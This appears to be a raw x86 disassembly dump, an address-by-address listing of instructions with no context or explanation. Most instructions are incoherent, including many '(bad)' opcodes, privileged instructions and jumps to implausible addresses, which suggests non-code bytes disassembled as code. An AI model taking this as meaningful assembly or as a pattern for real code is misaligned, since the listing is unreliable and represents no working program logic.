  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
